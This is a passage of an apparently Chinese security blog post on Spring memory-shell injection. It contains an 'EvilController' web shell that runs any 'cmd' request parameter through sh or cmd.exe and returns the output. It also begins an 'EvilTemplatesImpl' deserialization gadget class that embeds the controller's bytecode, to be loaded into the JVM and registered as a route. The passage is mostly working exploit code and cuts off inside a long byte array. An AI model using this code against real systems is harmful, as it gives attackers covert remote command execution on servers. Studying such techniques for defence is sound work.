class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                    isLinux = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                response.getWriter().write(output);</span><br><span class="line">                response.getWriter().flush();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                response.sendError(<span class="number">404</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var8) &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后用test2方法生成上面Controller类的字节码，然后跟websocket反序列化类似，从当前线程中拿到ClassLoader，然后将这个恶意的Controller加载进JVM，并按照刚刚提的第三种方法自定义注册RequestMapping：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.vul_demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMethod;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilTemplatesImpl</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> <span class="string">&quot;com.example.vul_demo.EvilController&quot;</span>;</span><br><span class="line">            <span class="comment">//加载com.example.vul_demo.EvilController类的字节码</span></span><br><span class="line">            <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;-<span class="number">54</span>, -<span class="number">2</span>, -<span class="number">70</span>, -<span class="number">66</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">52</span>, <span class="number">0</span>, -<span class="number">115</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">30</span>, <span class="number">0</span>, <span class="number">72</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">73</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">74</span>, <span class="number">0</span>, <span class="number">75</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">76</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">77</span>, <span class="number">0</span>, <span class="number">78</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">79</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">80</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">81</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">82</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">83</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">84</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">85</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">86</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">87</span>, <span class="number">0</span>, <span class="number">88</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">87</span>, <span class="number">0</span>, <span class="number">89</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">90</span>, <span class="number">0</span>, <span class="number">91</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">92</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">0</span>, <span class="number">93</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">94</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">0</span>, <span class="number">95</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">0</span>, <span class="number">96</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">0</span>, <span class="number">97</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">98</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">99</span>, <span class="number">0</span>, <span class="number">100</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">101</span>, <span class="number">0</span>, <span class="number">102</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">101</span>, <span class="number">0</span>, <span class="number">103</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">99</span>, <span class="number">0</span>, <span class="number">104</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">105</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">106</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">107</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">60</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">105</span>, <span class="number">116</span>, <span class="number">62</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">67</span>, <span class="number">111</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">76</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">101</span>, <span class="number">78</span>, <span class="number">117</span>, <span class="number">109</span>, <span class="number">98</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">84</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">76</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">97</span>, <span class="number">108</span>, <span class="number">86</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">84</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">116</span>, <span class="number">104</span>, <span class="number">105</span>, <span class="number">115</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">37</span>, <span class="number">76</span>, <span class="number">99</span>, <span class="number">111</span>, <span class="number">109</span>, <span class="number">47</span>, <span class="number">101</span>, <span class="number">120</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">112</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">47</span>, <span class="number">118</span>, <span class="number">117</span>, <span class="number">108</span>, <span class="number">95</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">69</span>, <span class="number">118</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">67</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">111</span>, <span class="number">108</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">77</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">83</span>, <span class="number">104</span>, <span class="number">101</span>, <span class="number">108</span>, <span class="number">108</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">82</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">120</span>, <span class="number">47</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">118</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">104</span>, <span class="number">116</span>, <span class="number">116</span>, <span class="number">112</span>, <span class="number">47</span>, <span class="number">72</span>, <span class="number">116</span>, <span class="number">116</span>, <span class="number">112</span>, <span class="number">83</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">118</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">82</span>, <span class="number">101</span>, <span class="number">113</span>, <span class="number">117</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">59</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">120</span>, <span class="number">47</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">118</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">104</span>, <span class="number">116</span>, <span class="number">116</span>, <span class="number">112</span>, <span class="number">47</span>, <span class="number">72</span>, <span class="number">116</span>, <span class="number">116</span>, <span class="number">112</span>, <span class="number">83</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">118</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">82</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">112</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">105</span>, <span class="number">115</span>, <span class="number">76</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">117</span>, <span class="number">120</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">90</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">111</span>, <span class="number">115</span>, <span class="number">84</span>, <span class="number">121</span>, <span class="number">112</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">99</span>, <span class="number">109</span>, <span class="number">100</span>, <span class="number">115</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">91</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">115</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">99</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">110</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">111</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">112</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">113</span>, <span class="number">117</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">39</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">120</span>, <span class="number">47</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">118</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">104</span>, <span class="number">116</span>, <span class="number">116</span>, <span class="number">112</span>, <span class="number">47</span>, <span class="number">72</span>, <span class="number">116</span>, <span class="number">116</span>, <span class="number">112</span>, <span class="number">83</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">118</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">82</span>, <span class="number">101</span>, <span class="number">113</span>, <span class="number">117</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">112</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">120</span>, <span class="number">47</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">118</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">104</span>, <span class="number">116</span>, <span class="number">116</span>, <span class="number">112</span>, <span class="number">47</span>, <span class="number">72</span>, <span class="number">116</span>, <span class="number">116</span>, <span class="number">112</span>, <span class="number">83</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">118</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">82</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">112</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">97</span>, <span class="number">99</span>, <span class="number">107</span>, <span class="number">77</span>, <span class="number">97</span>, <span class="number">112</span>, <span class="number">84</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">82</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">45</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">108</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">92</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">106</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">109</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">110</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">105</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">77</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">104</span>, <span class="number">111</span>, <span class="number">100</span>, <span class="number">80</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">115</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">82</span>, <span class="number">117</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">86</span>, <span class="number">105</span>, <span class="number">115</span>, <span class="number">105</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">65</span>, <span class="number">110</span>, <span class="number">110</span>, <span class="number">111</span>, <span class="number">116</span>, <span class="number">97</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">115</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">56</span>, <span class="number">76</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">115</span>, <span class="number">112</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">102</span>, <span class="number">114</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">119</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">107</span>, <span class="number">47</span>, <span class="number">119</span>, <span class="number">101</span>, <span class="number">98</span>, <span class="number">47</span>, <span class="number">98</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">100</span>, <span class="number">47</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">110</span>, <span class="number">111</span>, <span class="number">116</span>, <span class="number">97</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">47</span>, <span class="number">82</span>, <span class="number">101</span>, <span class="number">113</span>, <span class="number">117</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">77</span>, <span class="number">97</span>, <span class="number">112</span>, <span class="number">112</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">108</span>, <span class="number">117</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">47</span>, <span class="number">115</span>, <span class="number">104</span>, <span class="number">101</span>, <span class="number">108</span>, <span class="number">108</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">83</span>, <span class="number">111</span>, <span class="number">117</span>, <span class="number">114</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">70</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">69</span>, <span class="number">118</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">67</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">111</span>, <span class="number">108</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">46</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">43</span>, <span class="number">76</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">115</span>, <span class="number">112</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">102</span>, <span class="number">114</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">119</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">107</span>, <span class="number">47</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">111</span>, <span class="number">116</span>, <span class="number">121</span>, <span class="number">112</span>, <span class="number">101</span>, <span class="number">47</span>, <span class="number">67</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">111</span>, <span class="number">108</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">59</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">31</span>, <span class="number">0</span>, <span class="number">32</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">99</span>, <span class="number">109</span>, <span class="number">100</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">109</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">111</span>, <span class="number">0</span>, <span class="number">112</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">111</span>, <span class="number">115</span>, <span class="number">46</span>, <span class="number">110</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">113</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">114</span>, <span class="number">0</span>, <span class="number">112</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">115</span>, <span class="number">0</span>, <span class="number">116</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">119</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">117</span>, <span class="number">0</span>, <span class="number">118</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">115</span>, <span class="number">104</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">45</span>, <span class="number">99</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">99</span>, <span class="number">109</span>, <span class="number">100</span>, <span class="number">46</span>, <span class="number">101</span>, <span class="number">120</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">47</span>, <span class="number">99</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">119</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">120</span>, <span class="number">0</span>, <span class="number">121</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">122</span>, <span class="number">0</span>, <span class="number">123</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">124</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">125</span>, <span class="number">0</span>, <span class="number">126</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">99</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">110</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">31</span>, <span class="number">0</span>, <span class="number">127</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">92</span>, <span class="number">65</span>, <span class="number">12</span>, <span class="number">0</span>, -<span class="number">128</span>, <span class="number">0</span>, -<span class="number">127</span>, <span class="number">12</span>, <span class="number">0</span>, -<span class="number">126</span>, <span class="number">0</span>, -<span class="number">125</span>, <span class="number">12</span>, <span class="number">0</span>, -<span class="number">124</span>, <span class="number">0</span>, <span class="number">116</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">110</span>, <span class="number">12</span>, <span class="number">0</span>, -<span class="number">123</span>, <span class="number">0</span>, -<span class="number">122</span>, <span class="number">7</span>, <span class="number">0</span>, -<span class="number">121</span>, <span class="number">12</span>, <span class="number">0</span>, -<span class="number">120</span>, <span class="number">0</span>, -<span class="number">119</span>, <span class="number">12</span>, <span class="number">0</span>, -<span class="number">118</span>, <span class="number">0</span>, <span class="number">32</span>, <span class="number">12</span>, <span class="number">0</span>, -<span class="number">117</span>, <span class="number">0</span>, -<span class="number">116</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">112</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">35</span>, <span class="number">99</span>, <span class="number">111</span>, <span class="number">109</span>, <span class="number">47</span>, <span class="number">101</span>, <span class="number">120</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">112</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">47</span>, <span class="number">118</span>, <span class="number">117</span>, <span class="number">108</span>, <span class="number">95</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">69</span>, <span class="number">118</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">67</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">111</span>, <span class="number">108</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">79</span>, <span class="number">98</span>, <span class="number">106</span>, <span class="number">101</span>, <span class="number">99</span>, <span class="number">116</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">37</span>, <span 